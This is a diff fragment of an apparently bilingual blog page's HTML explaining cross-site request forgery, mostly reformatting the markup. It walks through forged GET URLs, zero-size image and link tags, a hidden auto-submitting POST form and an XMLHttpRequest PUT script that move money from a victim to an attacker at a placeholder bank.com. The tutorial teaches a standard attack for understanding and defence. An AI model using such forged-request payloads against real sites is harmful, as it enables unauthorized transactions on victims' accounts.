+&lt;li&gt;Usually unnoticed by the victim user
+&lt;ul&gt;
 &lt;li&gt;Requests are sent by the browser behind the scenes&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;CSRF exploits the trust that a web site has in a user’s browser &lt;ul&gt;
+&lt;li&gt;CSRF exploits the trust that a web site has in a user’s browser
+&lt;ul&gt;
 &lt;li&gt;XSS exploits the trust a user has for a particular site&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
@@ -226,10 +263,11 @@
 &lt;li&gt;Characteristics of CSRF&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;Web sites rely on a user’s identity &lt;/li&gt;
-&lt;li&gt;The site has trust in that identity &lt;/li&gt;
-&lt;li&gt;The user’s browser is tricked into sending HTTP requests to a target site &lt;/li&gt;
-&lt;li&gt;Such HTTP requests have side effects &lt;ul&gt;
+&lt;li&gt;Web sites rely on a user’s identity&lt;/li&gt;
+&lt;li&gt;The site has trust in that identity&lt;/li&gt;
+&lt;li&gt;The user’s browser is tricked into sending HTTP requests to a target site&lt;/li&gt;
+&lt;li&gt;Such HTTP requests have side effects
+&lt;ul&gt;
 &lt;li&gt;Because the attacker doesn’t receive the response&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
@@ -237,57 +275,85 @@
 &lt;h2 id=&#34;Example&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Example&#34;&gt;#&lt;/a&gt;Example&lt;/h2&gt;
 Example Description：
 Alice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: 
-
 &lt;ul&gt;
-&lt;li&gt;Build an exploit URL or script &lt;/li&gt;
+&lt;li&gt;Build an exploit URL or script&lt;/li&gt;
 &lt;li&gt;Trick Alice into executing the action with social engineering&lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol&gt;
-&lt;li&gt;Example: GET&lt;br&gt; A GET request from Alice to transfer money to Bob  &lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;BOB&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-Charlie first forges the following exploit URL&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;CHARLIE&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-Then, Charlie tricks Alice into loading this URL &lt;strong&gt;when Alice is logged into the bank&lt;/strong&gt;例如通过发送恶意电子邮件或在其他网站上种植恶意链接。&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;查看我的图片！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-或&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;width&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;height&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;Example: POST&lt;br&gt;A POST request from Alice to transfer money to Bob&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; acct=BOB&amp;amp;amount=100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-Charlie first crafts some hidden FORM tags &lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;100000&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;查看我的图片！&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-Then, Charlie tricks Alice to click on the submit button&lt;br&gt;Can also be executed automatically using JavaScript&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;document.forms[0].submit()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;Example: Other HTTP Methods&lt;br&gt; Charlie can use HTTP PUT method that takes a JSON object as an argument&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;acct&amp;quot;: &amp;quot;CHARLIE&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;amount&amp;quot;: 100000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-Such requests can be executed with JavaScript &lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;put&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; x = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;XMLHttpRequest&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;PUT&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;send&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;JSON&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;stringify&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&amp;#125;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;Example: GET&lt;br&gt;
+A GET request from Alice to transfer money to Bob&lt;/li&gt;
 &lt;/ol&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;BOB&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Charlie first forges the following exploit URL&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;CHARLIE&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Then, Charlie tricks Alice into loading this URL &lt;strong&gt;when Alice is logged into the bank&lt;/strong&gt; 例如通过发送恶意电子邮件或在其他网站上种植恶意链接。&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;查看我的图片！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;或&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;width&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;height&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Example: POST&lt;br&gt;
+A POST request from Alice to transfer money to Bob&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; acct=BOB&amp;amp;amount=100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Charlie first crafts some hidden FORM tags&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;100000&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;查看我的图片！&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Then, Charlie tricks Alice to click on the submit button&lt;br&gt;
+Can also be executed automatically using JavaScript&lt;/p&gt;
